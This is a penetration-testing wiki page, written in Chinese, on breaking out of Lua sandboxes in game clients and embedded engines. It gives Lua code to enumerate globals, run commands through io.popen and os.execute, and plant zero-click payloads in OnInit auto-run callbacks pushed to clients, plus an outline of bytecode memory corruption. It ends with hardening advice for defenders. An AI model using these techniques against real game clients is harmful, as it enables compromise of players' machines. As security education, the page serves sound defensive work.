# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

此页面收集了用于枚举和突破嵌入应用程序中的 Lua "sandboxes" 的实用技术，尤其适用于 game clients、plugins 或应用内 scripting engines。许多 engine 会公开受限的 Lua 环境，但仍会留下可访问的强大 globals，从而实现任意 command execution，甚至在暴露 bytecode loaders 时造成 native memory corruption。

关键思路：
- 将 VM 视为未知环境：枚举 _G，并发现哪些危险 primitives 可访问。
- 当 stdout/print 被阻止时，滥用 VM 内的 UI/IPC channel 作为 output sink，以观察结果。
- 如果 io/os 被暴露，通常可以直接执行 commands（io.popen、os.execute）。
- 如果 load/loadstring/loadfile 被暴露，在某些版本中，执行精心构造的 Lua bytecode 可以破坏 memory safety（≤5.1 的 verifiers 可被绕过；5.2 已移除 verifier），从而实现 advanced exploitation。

## Enumerate the sandboxed environment

- Dump 全局环境，以盘点可访问的 tables/functions：
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- 如果没有可用的 print()，可以重新利用 VM 内的通信通道。以下示例来自一个 MMO 房屋脚本 VM，其中聊天输出只有在调用 sound 后才会生效；下面的代码构建了一个可靠的输出函数：<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
将此模式推广到你的目标环境：任何接受字符串的 textbox、toast、logger 或 UI callback 都可以充当 reconnaissance 的 stdout。

## 如果暴露了 io/os，则可直接执行命令

如果 sandbox 仍然暴露标准库 io 或 os，你很可能可以立即执行命令：
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
注意：

- 执行发生在 client process 内部；许多会阻止 external debuggers 的 anti-cheat/antidebug 层，无法阻止在 VM 内创建进程。
- 另请检查：package.loadlib（任意 DLL/.so 加载）、使用 native modules 的 require、LuaJIT 的 ffi（如果存在），以及 debug library（可在 VM 内提升权限）。

## 通过 auto-run callbacks 实现零点击触发

如果 host application 将脚本推送到 clients，且 VM 暴露了 auto-run hooks（例如 OnInit/OnLoad/OnEnter），可将 payload 放置于其中，以便脚本加载后立即进行 drive-by compromise：<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
任何等效的 callback（OnLoad、OnEnter 等）都可以在 scripts 自动传输并在 client 上执行时推广这一 technique。

## Recon 期间需要寻找的危险 primitives

在枚举 _G 时，重点寻找：
- io、os：io.popen、os.execute、file I/O、env access。
- load、loadstring、loadfile、dofile：执行 source 或 bytecode；支持加载不受信任的 bytecode。
- package、package.loadlib、require：dynamic library loading 和 module surface。
- debug：setfenv/getfenv（≤5.1）、getupvalue/setupvalue、getinfo 以及 hooks。
- 仅限 LuaJIT：ffi.cdef、ffi.load，可直接调用 native code。

最小使用示例（如果可访问）：

Lua 的 loader API 在不同版本之间有所变化：在 Lua 5.1 中，`load` 从 reader function 读取内容，而 `loadstring` 从 string 读取内容；Lua 5.2 的 `load` 接受 string 或 reader function，而 `loadstring` 已被弃用，因为它是前者的等效形式。<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## 可选提权：滥用 Lua bytecode loaders

当 load/loadstring/loadfile 可访问但 io/os 受到限制时，执行构造的 Lua bytecode 可能导致内存泄露和内存破坏原语。关键事实：
- Lua ≤ 5.1 自带一个已知存在绕过方法的 bytecode verifier。<sup>[[4]](#references)</sup>
- Lua 5.2 完全移除了 verifier（官方立场是应用应直接拒绝预编译 chunk）；如果未禁止加载 bytecode，这会扩大攻击面。<sup>[[2]](#references)[[3]](#references)</sup>
- 典型流程是：通过 VM 内输出 leak 指针，构造 bytecode 以制造类型混淆（例如围绕 FORLOOP 或其他 opcode），然后 pivot 到任意读写或 native code execution。<sup>[[2]](#references)[[4]](#references)</sup>

此路径依赖具体 engine/version，并且需要 RE。有关深入分析、利用原语以及 games 中的示例 gadgetry，请参阅 references。

## 检测与加固说明（面向 defenders）

- Server side：拒绝或重写 user scripts；对安全 API 使用 allowlist；移除或绑定为空 io、os、load/loadstring/loadfile/dofile、package.loadlib、debug、ffi。
- Client side：使用最小化的 _ENV 运行 Lua，禁止加载 bytecode，重新引入严格的 bytecode verifier 或 signature checks，并阻止从 client process 创建进程。
- Telemetry：对 script load 后不久发生的 gameclient → child process creation 发出 alert；并与 UI/chat/script events 进行关联。

## References

- [1] [这栋房子闹鬼：AION client（使用 Lua VM）中一个有十年历史的 RCE](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown：揭开 Factorio 的 Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l（2009）：关于移除 bytecode verifier 的讨论](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [利用 Lua 5.1 bytecode（包含 verifier bypasses/notes 的 gist）](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
